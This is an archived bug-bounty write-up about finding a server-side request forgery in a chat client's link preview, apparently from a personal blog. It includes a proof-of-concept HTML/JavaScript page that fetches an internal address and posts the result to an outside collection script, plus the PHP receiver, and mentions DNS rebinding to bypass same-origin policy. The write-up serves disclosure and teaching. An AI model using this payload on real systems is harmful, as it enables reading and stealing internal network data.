---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-11-05_bugbounty-a-simple-ssrf.md
original_filename: 2019-11-05_bugbounty-a-simple-ssrf.md
title: BugBounty | A Simple SSRF
category: documents
detected_topics:
- ssrf
- xss
- command-injection
- rate-limit
tags:
- imported
- documents
- ssrf
- xss
- command-injection
- rate-limit
language: en
raw_sha256: 367aa1a67da85b94183ff274668590a1b841c624aedcf40ec3f03acadb263cc7
text_sha256: 7efe21fc5bba492d062fbe8120a76449b2c577ed2d40439e6aefb9061e5bab92
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# BugBounty | A Simple SSRF

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-11-05_bugbounty-a-simple-ssrf.md
- Source Type: markdown
- Detected Topics: ssrf, xss, command-injection, rate-limit
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `367aa1a67da85b94183ff274668590a1b841c624aedcf40ec3f03acadb263cc7`
- Text SHA256: `7efe21fc5bba492d062fbe8120a76449b2c577ed2d40439e6aefb9061e5bab92`


## Content

---
title: "BugBounty | A Simple SSRF"
page_title: "BugBounty | A Simple SSRF – Jinone – 败絮其中"
url: "https://jinone.github.io/bugbounty-a-simple-ssrf/"
final_url: "https://jinone.github.io/bugbounty-a-simple-ssrf/"
authors: ["Jinone (@jinonehk)"]
bugs: ["SSRF", "DNS rebinding"]
bounty: "1,500"
publication_date: "2019-11-05"
added_date: "2022-12-26"
source: "pentester.land/writeups.json"
original_index: 4957
---

# BugBounty | A Simple SSRF

2019-11-05 

  * [ bugbounty ](https://jinone.github.io/tags#bugbounty)
  * [ SSRF ](https://jinone.github.io/tags#SSRF)

I was working on a private program which i cannot disclose

First of all, its web assets have several subdomains. After I tested it for a while, I plan to look at the mac client.

The mac client has an chat interface where i found a SSRF.

The following is the whole process

After installation, sign up for login, then I see a chat interface.

Send a URL

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/1.png) It seems to preview the url, return a title and favicons

I use my server ip to test. Then received

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t3.png) Found that is the browser’s ua header

Then I tested it http://127.0.0.1 https://127.0.0.1 file://etc/passwd ….

Tested a lot of common internal ip

But

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t1.png) ![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t2.png) No effect

Then I tried the subdomain brute force, as well as some asset discovery sites to find internal ip

Until there is an ip

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t4.png) Seems to be successful

Then I quickly submitted the vulnerability

But

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t5.png) As written above, we can only get a very small amount of content.

After testing, I found that it will also execute js because it is browser ua
  
  
  <html><p id='d1'></p>
  <script>
  function get(url) {
  try {
  var req = new XMLHttpRequest();
  req.open('GET', url, false);
  req.send(null);
  if(req.status == 200)
  return req.responseText;
  } catch(err) {
  }
  return null;
  }
  var role = get('https://google.com');
  document.getElementById("d1").innerHTML=role.length;
  </script></html>
  

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t6.png)

Can successfully get Google returns the content length

Does not seem to be blocked by Same Origin Policy

Then we can get any internal network content

**POC**

xxx.php
  
  
  <?php
  file_put_contents("save.txt", $_POST['cc'] . "\n", FILE_APPEND);
  ?>
  

poc.html
  
  
  <html><p id='d1'></p>
  <script>
  function get(url) {
  try {
  var req = new XMLHttpRequest();
  req.open('GET', url, false);
  req.send(null);
  if(req.status == 200)
  return req.responseText;
  } catch(err) {
  }
  return null;
  }
  function post(url,content){
  var req = new XMLHttpRequest();
  req.open("POST", url, true);
  var formData = new FormData();
  formData.append("cc", content);
  req.send(formData);
  }
  var role = get('https://Internal ip');
  post('https://xxxxxxxxxxx.com/xxx.php',escape(role));
  document.getElementById("d1").innerHTML=role.length;
  </script></html>
  

Then check save.txt (You can also use the Burp Collaborator client)

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t8.png) Url decoding

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t9.png)

We are successful in getting the full content of any address on the internal network.

**If Same Origin Policy blocks**

Bypass Same Origin Policy with DNS-rebinding to retrieve Internal server .

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t23.png)

Details from https://github.com/mpgn/ByP-SOP

Finally ![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t11.png)

I got the highest bounty reward for this private project.

![Image failed to load](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t22.png)

[ BugBounty | A Dom Xss  ](https://jinone.github.io/bugbounty-a-dom-xss/)
